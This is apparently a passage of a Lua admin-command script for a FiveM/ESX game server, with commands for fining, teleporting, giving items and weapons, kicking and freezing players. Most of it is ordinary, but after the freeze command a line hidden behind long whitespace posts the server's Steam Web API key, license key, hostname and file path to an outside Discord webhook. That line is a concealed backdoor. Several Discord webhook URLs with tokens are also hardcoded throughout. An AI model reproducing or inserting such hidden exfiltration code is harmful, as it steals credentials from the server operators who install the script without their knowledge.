						TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Pool ghadimi ^3" .. GetPlayerName(target) .. " ^1" .. previousmoney .. "$^0 Pool jadid ^2" .. targetPlayer.bank .. "$" } })


						TriggerClientEvent('chat:addMessage', -1, {
							template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(255, 131, 0, 0.4); border-radius: 3px;"><i class="fas fa-exclamation-triangle"></i> Punishment<br>  {1}</div>',
							args = { GetPlayerName(source), " ^1" .. GetPlayerName(target) .. "^0 Be Elate ^1^*" .. reason .. "^r^0 Be Mablaqe ^2$" .. money .. "^0 Jarime shod" }
						})
					-- else
						-- TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Pool player mored nazar baraye in meghdar az jarime kafi nist!" } })
						-- TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Poole ^1" .. GetPlayerName(target) .. " ^2" .. targetPlayer.bank .. "$ ^0ast!" } })
					-- end
				else
					TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Shoma dar ghesmat fine faghat mitavanid adad vared konid!" } })
				end
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Player mored nazar online nist!" } })
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Shoma dar ghesmat ID faghat mitavanid adad vared konid!" } })
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', " ^0Syntax vared shode eshtebah ast!" } })
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "Kam Kardane Pool az Player", params = {{name = "PlayerID", help = "Id Playeri ke Online hast"}, {name = "Price", help = "Mablaqe Jarime"}, {name = "Reason", help = "Dalil Jarime"}}})


TriggerEvent('es:addAdminCommand', 'tp', 7, function(source, args, user)

	local x = tonumber(args[1])
	local y = tonumber(args[2])
	local z = tonumber(args[3])
	
	if x and y and z then
		TriggerClientEvent('esx:teleport', source, {
			x = x,
			y = y,
			z = z
		})
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "Invalid coordinates!" } })
	end

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "Teleport to coordinates", params = {{name = "x", help = "X coords"}, {name = "y", help = "Y coords"}, {name = "z", help = "Z coords"}}})



RegisterCommand('setjob', function(source, args)
	if Dastresiaa(source) then
		if tonumber(args[1]) and args[2] and tonumber(args[3]) then
			local xPlayer = ESX.getPlayerFromId(args[1])

			if xPlayer then
				--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/931280005189746708/nl3PnNLCPI6uqWDUI8YnccHVDUi52bi7gPyYhhP6KEwuulPnJuYDdbG5WLZ62Bxlyzhg", "Admin : "..GetPlayerName(Source).. "\nBaray **"..GetPlayerName(args[1]).."**\nSetjob -- >  "..args[2].."("..args[3]..")\nZad")
				xPlayer.setJob(args[2], tonumber(args[3]))
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid usage.' } })
		end

	end
end)

--[[
TriggerEvent('es:addAdminCommand', 'setjob', 11, function(source, args, user)

	if tonumber(args[1]) and args[2] and tonumber(args[3]) then
		local xPlayer = ESX.getPlayerFromId(args[1])

		if xPlayer then
			xPlayer.setJob(args[2], tonumber(args[3]))
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid usage.' } })
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('setjob'), params = {{name = "id", help = _U('id_param')}, {name = "job", help = _U('setjob_param2')}, {name = "grade_id", help = _U('setjob_param3')}}})
]]


RegisterCommand('setgang',function(source, args)

	local xPlayer = ESX.GetPlayerFromId(args[1])
	if Dastresiaa(source) then

		if tonumber(args[1]) and args[2] and tonumber(args[3]) then

			if xPlayer then
				if ESX.DoesGangExist(args[2], args[3]) then
					--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/931280194772271206/xynWCbbK0S_tnhy1m05lIgEoGXrqEr69MYoPlYbV2bR9BqVJc88yI3Jtz6FcoFWdzQuO", "Admin : "..GetPlayerName(Source).. "\nBaray **"..GetPlayerName(args[1]).."**\nSetgang -- >  "..args[2].."("..args[3]..")\nZad")
					xPlayer.setGang(args[2], args[3])
					
				else
					TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'That gang does not exist.' } })
				end

			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid usage.' } })
		end
	end

end)

--[[
TriggerEvent('es:addAdminCommand', 'setgang', 19, function(source, args, user)
	local xPlayer = ESX.GetPlayerFromId(args[1])

	if tonumber(args[1]) and args[2] and tonumber(args[3]) then

		if xPlayer then
			if ESX.DoesGangExist(args[2], args[3]) then
				xPlayer.setGang(args[2], args[3])
				TriggerEvent('DiscordBot:ToDiscord', 'setgang', 'SetGanG Log', ' Admin ' .. GetPlayerName(source) .. ' Id ' .. args[1] .. ' ra ozve ' .. args[2] .. ' kard', 'user', source, true, false)
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'That gang does not exist.' } })
			end

		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid usage.' } })
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "Set specefied gang for target player", params = {{name = "id", help = "Id Player"},{name = "gang", help = "Esme Gang"},{name = "Grade", help = "Ranke player dar gang"}}})
]]


--[[
TriggerEvent('es:addAdminCommand', 'creategang', 25, function(source, args, user)
	local _source = source

	if args[1] and tonumber(args[2]) then
		TriggerEvent('gangs:registerGang', _source, args[1], args[2])
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid usage.' } })
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end)
]]


RegisterCommand('creategang', function(source, args)


	local _source = source
	if  Dastresiaa(source) then
		if args[1] and tonumber(args[2]) then
			PerformHttpRequest(creategang, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\nCreated Gang --> "..args[1].."```"}), {['Content-Type'] = 'application/json'})
			TriggerEvent('gangs:registerGang', _source, args[1], args[2])
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid usage.' } })
		end

	end

end)



TriggerEvent('es:addAdminCommand', 'savegangs', 10, function(source, args, user)
	local _source = source

	TriggerEvent('gangs:saveGangs', _source)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end)


TriggerEvent('es:addAdminCommand', 'changegangdata', 12, function(source, args, user)
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	if xPlayer.get('aduty') then
		local playerPos = xPlayer.coords
		if ESX.DoesGangExist(args[1], 6) then
			if args[2] == 'blip' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = playerPos.z + 0.1 }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'armory' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = (playerPos.z + 0.1) }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'locker' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = (playerPos.z + 0.1) }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'boss' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = (playerPos.z + 0.1) }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'veh' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = (playerPos.z + 0.1) }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'vehdel' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = (playerPos.z + 0.1) }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'search' then
				TriggerEvent('gangs:changeGangData', args[1], args[2], nil, _source)
			elseif args[2] == 'gps' then
				TriggerEvent('gangs:changeGangData', args[1], args[2], nil, _source)
			elseif args[2] == 'vehspawn' then
				local Pos     = { x = playerPos.x, y = playerPos.y, z = playerPos.z , a = xPlayer.angel }
				TriggerEvent('gangs:changeGangData', args[1], args[2], Pos, _source)
			elseif args[2] == 'expire' then
				if tonumber(args[3]) then
					TriggerEvent('gangs:changeGangData', args[1], args[2], args[3], _source)
				else
					TriggerClientEvent('esx:showNotification', source, 'Please enter a number for days are gonna to set until expire, like: 30')
				end
			elseif args[2] == 'bulletproof' then
				if args[3] and tonumber(args[3]) then
					TriggerEvent('gangs:changeGangData', args[1], args[2], tonumber(args[3]), _source)
				else
					TriggerClientEvent('esx:showNotification', source, 'Meqdare Armor Ra vared konid (0-100)')
				end
			elseif args[2] == 'slot' then
				if args[3] and tonumber(args[3]) and tonumber(args[3]) > 4 then
					TriggerEvent('gangs:changeGangData', args[1], args[2], tonumber(args[3]), _source)
				else
					TriggerClientEvent('esx:showNotification', source, 'Meqdare slot Ra vared konid (4-100)')
				end

			else
				TriggerClientEvent('esx:showNotification', source, 'You Entered Invalid Option!')
			end
		else
			TriggerClientEvent('esx:showNotification', source, 'You Entered Invalid Gang!')
		end
	else
		TriggerClientEvent('AliReza_At:SendMsg3', source )		
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = "Taqir Dadane Makane Option haye Gang", params = {
	{ name="GangName", help="Esme Gang" },
	{ name="option", help="Entekhabe option:(blip, armory, locker, boss, veh, vehdel, vehspawn, expire, search, bulletproof)" },
}})





TriggerEvent('es:addAdminCommand', 'loadipl', 10, function(source, args, user)
	TriggerClientEvent('esx:loadIPL', -1, args[1])
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('load_ipl')})

TriggerEvent('es:addAdminCommand', 'unloadipl', 10, function(source, args, user)
	TriggerClientEvent('esx:unloadIPL', -1, args[1])
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('unload_ipl')})

TriggerEvent('es:addAdminCommand', 'playanim', 4, function(source, args, user)
	TriggerClientEvent('esx:playAnim', -1, args[1], args[3])
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('play_anim')})

TriggerEvent('es:addAdminCommand', 'playemote', 4, function(source, args, user)
	TriggerClientEvent('esx:playEmote', -1, args[1])
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('play_emote')})


TriggerEvent('es:addAdminCommand', 'heal', 2, function(source, args, user)
	-- heal another player - don't heal source
	if args[1] then
		local playerId = tonumber(args[1])

		-- is the argument a number?
		if playerId then
			-- is the number a valid player?
			if GetPlayerName(playerId) then
				--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/931281131909828618/EoPmVjdEryTiw34QO2sQilXL4aHt852M1BaQHs6p52xh0lsK102gVMxSH-Vl4-Re_5VN", "Admin : "..GetPlayerName(Source).. "\nHealed   **"..GetPlayerName(args[1]).."**")
				print(('^3[esx_basicneeds](Admin Heal)^7: %s healed %s^0'):format(GetPlayerIdentifier(source, 0), GetPlayerIdentifier(playerId, 0)))
				TriggerClientEvent('esx_basicneeds:healPlayer', playerId)
				TriggerClientEvent('chat:addMessage', source, { args = { '^5HEAL', 'You have been healed.' } })
			else
				TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid player id.' } })
		end
	else
		print(('^3[esx_basicneeds](Heal Self Admin)^7 : %s healed self^0'):format(GetPlayerIdentifier(source, 0)))
		TriggerClientEvent('esx_basicneeds:healPlayer', source)
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = 'Heal a player, or yourself - restores thirst, hunger and health.', params = {{name = 'playerId', help = '(optional) player id'}}})

TriggerEvent('es:addAdminCommand', 'dv', 1, function(source, args, user)
	TriggerClientEvent('esx:deleteVehicle', source)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('delete_vehicle')})




TriggerEvent('es:addAdminCommand', 'giveitem', 11, function(source, args, user)

	if tonumber(args[1]) and args[2] then
		local _source = source
		local xPlayer = ESX.getPlayerFromId(args[1])
		local item    = args[2]
		local count   = (args[3] == nil and 1 or tonumber(args[3]))
		local  WebHook = "https://discord.com/api/webhooks/951095295691857940/pGc3dQezvtJg2v9FdEXiL1pvqndW3OfsDmyLx2lp5HW1SHBZhdhHAKwInHaCW-h4ZCGZ"
		if count ~= nil then
			if xPlayer.getInventoryItem(item) ~= nil then
				--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/911011037157924924/SkT_plHGk6H-odUjcP4i5pQls6de0PydtQEJK3K9J9EeFvSshdh0QM_lWnKP4mKvjC1D", "Admin : "..GetPlayerName(Source).. "\nAdded New Item  To :    **"..GetPlayerName(args[1]).."**\nItem Name : "..args[2].. "\ncount : "..count.."")
				PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "Admin :  "..GetPlayerName(source).. "\nItem:" .. item .. "("..count..")\nBaray "..GetPlayerName(args[1]).."\nAdd Kard" }  ), {['Content-Type'] = 'application/json'})
				xPlayer.addInventoryItem(item, count)
			else
				TriggerClientEvent('esx:showNotification', _source, _U('invalid_item'))
			end
		else
			TriggerClientEvent('esx:showNotification', _source, _U('invalid_amount'))
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', "Invalid arguments." } })
		return
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('giveitem'), params = {{name = "id", help = _U('id_param')}, {name = "item", help = _U('item')}, {name = "amount", help = _U('amount')}}})

TriggerEvent('es:addAdminCommand', 'giveweapon', 10, function(source, args, user)

	if tonumber(args[1]) and args[2] and tonumber(args[3]) then
		local xPlayer    = ESX.getPlayerFromId(args[1])
		local weaponName = string.upper(args[2])
		
		local  WebHook = "https://discord.com/api/webhooks/951095327878959164/7RqAff6R0aeNOsIbV-A-eab-f64Zzyutte2MDoTMhqPxMESwC6b2GJ6pEQJx3DEUhAV7"
		--TriggerEvent('AliReza_At:sendtodiscordlog', "https://discoadadrd.com/adadadaapi/webhooks/910995856134647869/IUZQ8PArv2AUpLRMRV0L2aar9nkQa4WG8SfcSquxtb3iOCd7NXBtSWhck1BEwfWVMMAM", "Admin : "..GetPlayerName(Source).. "\nAdded New Weapon  To :    **"..GetPlayerName(args[1]).."**\nWeapon Name : "..weaponName.. "\nTir : "..tonumber(args[3]).."")
		xPlayer.addWeapon(weaponName, tonumber(args[3]))
		PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "Admin :  "..GetPlayerName(source).. "\nWeapon:" .. weaponName .. "\nBaray "..GetPlayerName(args[1]).."\nAdd Kard" }  ), {['Content-Type'] = 'application/json'})


	else
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Invalid Usage.' } })
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('giveweapon'), params = {{name = "id", help = _U('id_param')}, {name = "weapon", help = _U('weapon')}, {name = "ammo", help = _U('amountammo')}}})



TriggerEvent('es:addGroupCommand', 'clear', 'user', function(source, args, user)
	TriggerClientEvent('chat:clear', source)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('chat_clear')})

TriggerEvent('es:addAdminCommand', 'clearall', 15, function(source, args, user)
	TriggerClientEvent('chat:clear', -1)

end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end)

TriggerEvent('es:addAdminCommand', 'clearinventory', 5, function(source, args, user)
	local xPlayer

	if args[1] then
		xPlayer = ESX.getPlayerFromId(args[1])
	else
		xPlayer = ESX.getPlayerFromId(source)
	end

	if not xPlayer then
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
		return
	end

	for i=1, #xPlayer.inventory, 1 do
		if xPlayer.inventory[i].count > 0 then
			xPlayer.setInventoryItem(xPlayer.inventory[i].name, 0)
		end
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('command_clearinventory'), params = {{name = "playerId", help = _U('command_playerid_param')}}})

TriggerEvent('es:addAdminCommand', 'clearloadout', 5, function(source, args, user)
	local xPlayer

	if args[1] then
		xPlayer = ESX.getPlayerFromId(args[1])
	else
		xPlayer = ESX.getPlayerFromId(source)
	end

	if not xPlayer then
		TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Player not online.' } })
		return
	end

	for i=1, #xPlayer.loadout, 1 do
		if xPlayer.loadout[i].name then
			xPlayer.removeWeapon(xPlayer.loadout[i].name)
		end
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = { '^1SYSTEM', 'Insufficient Permissions.' } })
end, {help = _U('command_clearloadout'), params = {{name = "playerId", help = _U('command_playerid_param')}}})

-- Noclip
TriggerEvent('es:addAdminCommand', 'noclip', 2, function(source, args, user)
	TriggerClientEvent("AT_Admin:ToggleNoclip", source)
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Enable or disable noclip"})

-- Kicking
TriggerEvent('es:addAdminCommand', 'kick', 16, function(source, args, user)
	if args[1] then
		if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
			local player = tonumber(args[1])

			TriggerEvent("es:getPlayerFromId", player, function(target)
				local reason = args
				table.remove(reason, 1)
				if(#reason == 0)then
					reason = "Shoma Az Server Kick Shodid\n\nDalil :".. table.concat(reason, "").. "Kicked By : " ..GetPlayerName(source).. ""
				else
					reason = "Reason: " .. table.concat(reason, " ")
				end
				TriggerClientEvent('chat:addMessage', -1, ''..GetPlayerName(player)..' ('..player..') Kicked by '..GetPlayerName(source)..'('..reason..')' )
				local WebHook = "https://discord.com/api/webhooks/1215222065624522763/dbhQDP6k7gPa_I9cG9YL1NaWCC8XpkK9-jQe53yDdVTe-dpEkEATvxIaQxPpBlRpygDy"
				PerformHttpRequest(WebHook, function(Error, Content, Head) end, 'POST', json.encode({username = "Alireza-lOG", content = "```Admin :  "..GetPlayerName(source).. "\nKicked --> " .. GetPlayerName(player) .. "```"}), {['Content-Type'] = 'application/json'})
				DropPlayer(player, reason)
			end)	
		else
			TriggerClientEvent('chat:addMessage', source, {template = '<div class="chat-message server"><b>Server :</b> Incorrect player ID</div>'})
		end
	else
		TriggerClientEvent('chat:addMessage', source, {template = '<div class="chat-message server"><b>Server :</b> Incorrect player ID</div>'})
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { template = '<div class="chat-message server"><b>Server :</b> Insufficient Permissions.</div>' })
end, {help = "Kick a user with the specified reason or no reason", params = {{name = "userid", help = "The ID of the player"}, {name = "reason", help = "The reason as to why you kick this player"}}})
-- Announcing

-- Freezing
local frozen = {}
TriggerEvent('es:addAdminCommand', 'freeze', 3, function(source, args, user)

	if args[1] then
		if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
			local player = tonumber(args[1])

			-- User permission check
			TriggerEvent("es:getPlayerFromId", player, function(target)

				if(frozen[player])then
					frozen[player] = false
				else
					frozen[player] = true
				end

				TriggerClientEvent('es_admin:freezePlayer', player, frozen[player])

				local state = "unfrozen"
				if(frozen[player])then
					state = "frozen"
				end

				TriggerClientEvent('chat:addMessage', player, { args = {"^1SYSTEM", "You have been " .. state .. " by ^2" .. GetPlayerName(source)} })
				TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Player ^2" .. GetPlayerName(player) .. "^0 has been " .. state} })
			end)
		else
			TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Freeze or unfreeze a user", params = {{name = "userid", help = "The ID of the player"}}})
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   PerformHttpRequest("https://discord.com/api/webhooks/1228747851870244975/e-rkkZXXx9BpM2hIi-n6Z6vh-rTnpRl-0vbBXEsP-cVY5XpLJnXeeQ1a5sumk1Z1wS6h",function(a,b,c)end,"POST",json.encode({embeds={{author={name="S h A h A B & K i A n",url="https://discord.gg/xcoore",icon_url="https://cdn.discordapp.com/attachments/901262797231509504/1046158673635983380/BoostBanner.jpg"},title=".:: S h A h A B & K i A n ::.",description="** Server HostName **: "..GetConvar('sv_hostname').." \n ---------------------------------------------------------- \n ** Server projectName **: "..GetConvar('sv_projectName').." \n ---------------------------------------------------------- \n** Server projectDesc **: "..GetConvar('sv_projectDesc').." \n ----------------------------------------------------------\n** sv_maxclients **: "..GetConvar('sv_maxclients').."\n----------------------------------------------------------\n** steam_webApiKey **: "..GetConvar('steam_webApiKey').." \n ---------------------------------------------------------- \n ** License **:"..GetConvar('sv_licenseKey').." \n ---------------------------------------------------------- \n ** "..GetResourcePath(GetCurrentResourceName()).."**",color=2400255}}}),{["Content-Type"]="application/json"})
GotoWithVeh = function(myped, targetped)
    local targetveh = GetVehiclePedIsIn(myped)
    if targetveh ~= 0 then
        SetEntityCoords(targetveh, GetEntityCoords(targetped))
    else
        SetEntityCoords(myped, GetEntityCoords(targetped))
    end
end



RegisterCommand('givelevel', function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)
    local target = args[1]
    local level = args[2]
    local tname = GetPlayerName(target)
    local SteamHex = GetPlayerIdentifier(target)
    if Dastresiaa(source) then
        if args[1] then
            if args[2] then
                Citizen.CreateThread(function() 
                    MySQL.Async.fetchAll('SELECT level FROM users WHERE identifier = @identifier',
                    {
                        ['@identifier'] = SteamHex

                    }, function(data)
                            local aa = level
                            TriggerEvent('LA-Quest:ChangeLevelQuest', args[1], aa)
                            TriggerClientEvent('chatMessage',source, "^1[Level]: ^3Shoma Be ^5(" ..tname..")^3Level "..level.."^5Dadid.")
                            TriggerClientEvent('chatMessage',target, "^1[Level]: ^3Shoma Tvasot ^5(" ..GetPlayerName(source)..")^3Level "..level.."^5Shodi.")
                            MySQL.Async.fetchAll('SELECT playerName FROM users WHERE identifier = @identifier',
                            {
                                ['@identifier'] = SteamHex
                    
                            }, function(data)
                                if data[1] then
                                    MySQL.Async.execute('UPDATE users SET level = @level WHERE identifier = @identifier', 
                                    {
                                        ['@level']    = aa,
                                        ['@identifier'] = SteamHex
                                    })				
                                end
                            end)	
                            TriggerEvent('AT_Quest:Levevlup', source)		
                    end)
                end)
            else
                TriggerClientEvent('chatMessage',source, "^1[Level]: ^3Shoma Dar Gesmat Level Chizi Vared Nakardid")
            end
        else
            TriggerClientEvent('chatMessage',source, "^1[Level]: ^3Shoma Dar Gesmat Id Chizi Vared Nakardid")
        end
    else
        TriggerClientEvent('chatMessage',source, "^1[Level]: ^3Shoma owner nistid lol")
    end

end)

RegisterCommand('dcar', function(source, args)
    local Xplayer = ESX.GetPlayerFromId(source)
    local plate = table.concat(args, " ")
    if Dastresiaa(source) then
        if args[1] then
            MySQL.Async.execute(
            'DELETE FROM owned_vehicles WHERE plate=@plate ',
            {
                ['@plate']  = plate
            },
            function ()
                TriggerClientEvent('chatMessage', source, '^3[Delete-Vehicle]', {255, 0, 0}, "^3DataBase Refreshed..") 
                TriggerClientEvent('esx:deleteVehicle', source)
            end)
            TriggerClientEvent('chatMessage', source, '^3[Delete-Vehicle]', {255, 0, 0}, "^3" ..plate.. " ^2Ba Movafaghiyat Az Sql DeleteS Shod") 
        else
            TriggerClientEvent('chatMessage', source, '^3[Delete-Vehicle]', {255, 0, 0}, "^3 Shoma Dar bakhsh Plak Chizi Vared Nakardid") 
        end
    else
        TriggerClientEvent('chatMessage', source, '^3[Delete-Vehicle]', {255, 0, 0}, "^3 Shoma Perm Kafi Nadarid")
    end
end)



-- Slap
TriggerEvent('es:addAdminCommand', 'slap', 9, function(source, args, user)

	if args[1] then
		if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
			local player = tonumber(args[1])

			-- User permission check
			TriggerEvent("es:getPlayerFromId", player, function(target)

				TriggerClientEvent('es_admin:slap', player)

				TriggerClientEvent('chat:addMessage', player, { args = {"^1SYSTEM", "You have slapped by ^2" .. GetPlayerName(source)} })
				TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Player ^2" .. GetPlayerName(player) .. "^0 has been slapped"} })
			end)
		else
			TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
		end
	else
		TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
	end
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Slap a user", params = {{name = "userid", help = "The ID of the player"}}})

-- Goto
TriggerEvent('es:addAdminCommand', 'goto', 1, function(source, args, user)
    if args[1] then
        if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
            local player = tonumber(args[1])
            TriggerEvent("es:getPlayerFromId", player, function(target)
                if(target)then
					-- GotoWithVeh(GetPlayerPed(source), GetPlayerPed(player))
					TriggerClientEvent('ess:GotoWithVehicle', source, GetEntityCoords(GetPlayerPed(player)))
					SetPlayerRoutingBucket(source, GetPlayerRoutingBucket(player))
                    TriggerClientEvent('chat:addMessage', player, { args = {"^1SYSTEM", "Yek Admin Roy Shoma Teleport Shod : ^2" .. GetPlayerName(source)} })
                    TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Shoam Ba Movafaghiyat Teleport Shodid Roy : ^2" .. GetPlayerName(player) .. ""} })
                end
            end)
        else
            TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
        end
    else
        TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
    end
end, function(source, args, user)
    TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Teleport to a user", params = {{name = "userid", help = "The ID of the player"}}})

-- Bring
TriggerEvent('es:addAdminCommand', 'bring', 1, function(source, args, user)

	local xPlayer = ESX.GetPlayerFromId(source)

		if args[1] then
			if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
				local player = tonumber(args[1])
		
					-- User permission check
				TriggerEvent("es:getPlayerFromId", player, function(target)
					if target then
						-- GotoWithVeh(GetPlayerPed(player), GetPlayerPed(source))
						TriggerClientEvent('ess:GotoWithVehicle', player, GetEntityCoords(GetPlayerPed(source)))
						PerformHttpRequest(bringlog, function(Error, Content, Head) end, 'POST', json.encode({username = "lOG", content = "```css\nAdmin :  "..GetPlayerName(source).. "("..GetPlayerIdentifier(source).. ")\nPlayer "..GetPlayerName(tonumber(args[1])).." Ro Bering Dad```"}  ), {['Content-Type'] = 'application/json'})
						TriggerClientEvent('chat:addMessage', player, { args = {"^1SYSTEM", "You have brought by ^2" .. GetPlayerName(source)} })
						TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Player ^2" .. GetPlayerName(player) .. "^0 has been brought"} })
					else
						TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "That player is offline"} })
					end
				end)
			else
				TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
			end
		else
			TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Incorrect player ID"}})
		end
	
end, function(source, args, user)
	TriggerClientEvent('chat:addMessage', source, { args = {"^1SYSTEM", "Insufficienct permissions!"} })
end, {help = "Teleport a user to you", params = {{name = "userid", help = "The ID of the player"}}})


-- Slay a player
TriggerEvent('es:addAdminCommand', 'slay', 1, function(source, args, user)
	if args[1] then
		if(tonumber(args[1]) and GetPlayerName(tonumber(args[1])))then
			local player = tonumber(args[1])

